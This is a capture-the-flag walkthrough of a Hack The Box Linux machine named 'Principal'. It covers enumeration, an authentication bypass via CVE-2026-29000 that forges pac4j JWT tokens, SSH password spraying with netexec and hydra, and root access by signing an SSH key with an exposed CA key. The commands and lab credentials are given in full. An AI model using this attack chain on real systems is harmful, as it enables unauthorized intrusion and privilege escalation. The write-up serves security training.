# PRINCIPAL -- Linux

---
## Enumeration



---
#### NMAP

```
sudo nmap -Pn -sCV 10.129.244.220 -vvv --min-rate 8888 -oN tcp.nmap
```

//Note `Jetty`


<img width="573" height="393" alt="image" src="https://github.com/user-attachments/assets/7dca15a8-b047-4905-baa2-c863f0e2dd20" />





---
#### FEROXBUSTER

```
feroxbuster -u http://principal.htb:8080
```

Found:

<img width="746" height="205" alt="image" src="https://github.com/user-attachments/assets/10c159d4-fd93-4855-8524-06735bd03f22" />



---
#### BURP

<img width="1254" height="379" alt="image" src="https://github.com/user-attachments/assets/03f233b1-45f5-462f-a7c5-12da07231661" />


Note:
- `pac4j-jwt/6.0.3`
- And supposed key `lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw`
- `/api/auth/jwks` //now then we go back to feroxbuster and bruteforce /api and /api/auth -- nothing stands out



---
#### GOOGLE

Googled `pac4j-jwt/6.0.3` and found:

- `https://github.com/advisories/GHSA-pm7g-w2cf-q238`
- `https://github.com/kernelzeroday/CVE-2026-29000`





---
## EXPLOITATION



---
#### CVE-2026-29000: pac4j-jwt JwtAuthenticator authentication bypass

<img width="899" height="315" alt="image" src="https://github.com/user-attachments/assets/ca74e6df-3993-4ee2-9629-bdbe418d44dc" />


//to exploit this vulnerability, we could use a python script whipped up by 0xdf (thank you!) to forge auth token -- `https://0xdf.gitlab.io/2026/03/30/htb-principal.html#`

```
python3 cve-2026-29000-0xdf.py 10.129.12.56
```

<img width="563" height="239" alt="image" src="https://github.com/user-attachments/assets/21355ad4-200e-45f8-b491-1e30da137df4" />


//verify on burp -- and it appears to have worked


<img width="1245" height="405" alt="image" src="https://github.com/user-attachments/assets/4acae100-9b21-4d5e-915c-c50d784c5c35" />


//then on the main page -- fire up firefox dev tools console


```
sessionStorage.setItem('auth_token', 'eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVu...iP5Y9bAOIR4L3cZ8Iq8-Ka_OtSgYA6xBtUfpmxylUdmyqB')
```




//we're in -- found a list of potential users

<img width="1158" height="585" alt="image" src="https://github.com/user-attachments/assets/09a8c4a5-65b8-4ecf-8351-8fa2cb9b436a" />



//Found a potential passwd `D3pl0y_$$H_Now42!`

<img width="764" height="324" alt="image" src="https://github.com/user-attachments/assets/5d734f0f-44fc-4d8d-934a-003040684bfb" />




---
#### NETEXEC

```
netexec ssh 10.129.12.56 -u users -p 'D3pl0y_$$H_Now42!' --continue-on-success
```

//run netexec to validate creds -- and the password works with svc-deploy user

<img width="771" height="181" alt="image" src="https://github.com/user-attachments/assets/741948e8-24db-4153-be76-5515219fe704" />





//alternatively we could also use hydra

```
hydra ssh://10.129.12.56 -L users -p 'D3pl0y_$$H_Now42!'
```

<img width="837" height="192" alt="image" src="https://github.com/user-attachments/assets/9df2a6f6-45eb-481a-a7d4-ea9782856c95" />




---
#### SSH

```
ssh -q svc-deploy@10.129.12.56
```

//and got user svc-deploy


<img width="562" height="386" alt="image" src="https://github.com/user-attachments/assets/86fc51ef-7ee5-49bf-bcc5-c2e8a4205b5c" />





---
## PRIVESC


---

#### Post-Exploitation Enumeration

```
sudo -l
```

//can't run sudo


```
ll /opt
```

//the web is run off of /opt/principal and not /var/www/html

```
ll /opt/principal/ssh
```

<img width="517" height="255" alt="image" src="https://github.com/user-attachments/assets/8643c402-66fa-4e43-b2bd-214ba0bd330a" />


#### SSH PRINCIPAL


- path to root may have something to do with SSH -- given the name of the box also
- google `ssh principal`
- found `https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d`



//so `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` should be configured when `TrustedUserCAKeys` is in play.


<img width="493" height="93" alt="image" src="https://github.com/user-attachments/assets/f146f7db-f756-47f7-bd6c-370a5d219d5d" />


1. since they're not present -- we should be able to map cert principals directly to names of user
2. we should get root access if we sign our ssh key with `ca` key found in `/opt/principal/ssh/ca`
3. use `scp` or just copy paste the key onto our kali -- then `chmod 600 ca`

<img width="514" height="350" alt="image" src="https://github.com/user-attachments/assets/1d7ccbd3-c22f-4484-8270-89723ad370ea" />



```
ssh-keygen -t ed25519 -f root-principal
```

//here we first create our new key


<img width="476" height="330" alt="image" src="https://github.com/user-attachments/assets/7d9c9d05-6647-4999-9e2d-a225fd1f80ba" />


```
ssh-keygen -s ca -I e8ht -n  root root-principal
```

//then we sign it with the `ca` key from target


<img width="509" height="120" alt="image" src="https://github.com/user-attachments/assets/33583a6f-5a95-47f9-9b29-6e8d912c2c11" />


```
ssh -i root-principal root@10.129.12.56
```

//and we got in as root

<img width="527" height="234" alt="image" src="https://github.com/user-attachments/assets/bd7f9cef-b988-451f-80cf-813cde855362" />






